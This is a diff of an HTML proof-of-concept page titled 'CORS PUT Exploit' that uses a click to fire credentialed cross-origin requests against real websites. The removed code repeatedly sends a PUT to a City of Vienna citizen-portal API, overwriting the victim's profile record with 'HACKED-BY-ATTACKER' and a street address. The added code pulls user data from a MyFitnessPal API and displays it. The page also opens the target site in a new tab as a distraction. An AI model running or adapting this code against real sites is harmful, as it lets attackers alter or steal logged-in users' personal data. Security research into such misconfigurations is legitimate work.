@@ -4,7 +4,7 @@
     <title>CORS PUT Exploit</title>
 </head>
 <body>
-    <p>Click anywhere on this page to trigger the Cross-origin PUT request.</p>
+    <p>Click anywhere on this page to trigger the Cross-origin request.</p>
     <div id="response"></div>
 
     <script>
@@ -15,97 +15,36 @@
                 if (isAttacking) return; 
                 
                 isAttacking = true;
+                
                 // Open target site in new tab (distraction)
-                open('https://mein.wien.gv.at/Mein-Profil');
+                window.open('https://mein.wien.gv.at/Mein-Profil');
                 
-                function sendRequest() {
-                    // Send PUT request to vulnerable endpoint
-                    fetch('https://mein.wien.gv.at/broker/public/api/Datenblock/JSPutDatenblock', {
-                        method: 'PUT',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json, text/javascript, */*; q=0.01',
-                            'X-Requested-With': 'XMLHttpRequest'
-                        },
-                        credentials: 'include',
-                        mode: 'cors',
-                        body: JSON.stringify({
-                            "id": null,
-                            "datensatz": "5797DABA-954A-4206-8922-39FED77C454D",
-                            "inhalt": {
-                                "title": "HACKED-BY-ATTACKER",
-                                "standard": true,
-                                "address": "Gudrunstraße 29/2, 1100 Wien",
-                                "coordinates": [16.390721448021026, 48.175427363211405],
-                                "source": "DSS-Portal/OGD",
-                                "inhalt": {
-                                    "adresse": {
-                                        "adressart": 0,
-                                        "adresse": "Gudrunstraße 29/2, 1100 Wien",
-                                        "adresseKurzschreibweise": "Gudrunstraße 29/2",
-                                        "adressobjektId": 10221247,
-                                        "gemeindebezirksbezeichnung": "Favoriten",
-                                        "gemeindebezirksnummer": 10,
-                                        "gemeindekennziffer": 90001,
-                                        "gemeindename": "Wien",
-                                        "koordinatenbezugssystem": 4326,
-                                        "ländercode": "AUT",
-                                        "orientierungsnummer": "20",
-                                        "orientierungsnummerLage": 0,
-                                        "ortskennziffer": 91001,
-                                        "ortsname": "Favoriten",
-                                        "straßenkennziffer": 1660,
-                                        "zugangsadresspunktX": 48.175427363211405,
-                                        "zugangsadresspunktY": 16.390721448021026,
-                                        "PLZ": 1100,
-                                        "zusatzinformationen": {
-                                            "adressStraßenname": "Gudrunstraße",
-                                            "baublock": "",
-                                            "NUTS2": "",
-                                            "orientierungsnummerVon": "29",
-                                            "orientierungsnummerVerbindungszeichen": 0,
-                                            "straßenabschnittsId": "01660009017",
-                                            "zählbezirk": "1002",
-                                            "zählgebiet": "10023"
-                                        }
-                                    },
-                                    "eingang": "",
-                                    "geschosstyp": "",
-                                    "stiege": "2",
-                                    "stock": "",
-                                    "zimmer": "",
-                                    "zimmertyp": "Tür"
-                                }
-                            }
-                        })
-                    })
-                    .then(response => {
-                        if (response.status === 200) {
-                            // Success - show alert and stop
-                            return response.json().then(data => {
-                                alert('SUCCESS! Status 200\n\nResponse:\n' + JSON.stringify(data, null, 2));
-                            });
+                // Execute CORS request
+                makeCorsRequest();
+            };
+            
+            function makeCorsRequest() {
+                var xhttp = new XMLHttpRequest();
+                
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4) {
+                        console.log("Status:", this.status);
+                        if (this.status == 200) {
+                            console.log("Response:", this.responseText);
+                            alert("Success! Response: " + this.responseText);
+                            document.getElementById("response").innerHTML = this.responseText;
                         } else {
-                            // Not 200 - wait 1 second then send request again
-                            document.getElementById('response').innerHTML = 
-                                'Status ' + response.status + ' - retrying...';
-                            
-                            // Wait 1 second (1000ms) before sending next request
-                            setTimeout(sendRequest, 2000);
+                            console.error("Error:", this.status, this.statusText);
+                            alert("Error: " + this.status);
                         }
-                    })
-                    .catch(error => {
-                        // Error - wait 1 second then send request again
-                        document.getElementById('response').innerHTML = 
-                            'Error - Waiting 1 second then retrying...';
-                        
-                        // Wait 1 second (1000ms) before sending next request
-                        setTimeout(sendRequest, 2000);
-                    });
-                }
+                    }
+                };
                 
-                // Start sending requests
-                sendRequest();
+                // Note: This will likely fail due to CORS policy
+                // unless myfitnesspal.com has permissive CORS headers
+                xhttp.open("GET", "https://www.myfitnesspal.com/api/services/users", true);
+                xhttp.withCredentials = true;
+                xhttp.send();
             }
         });
     </script>
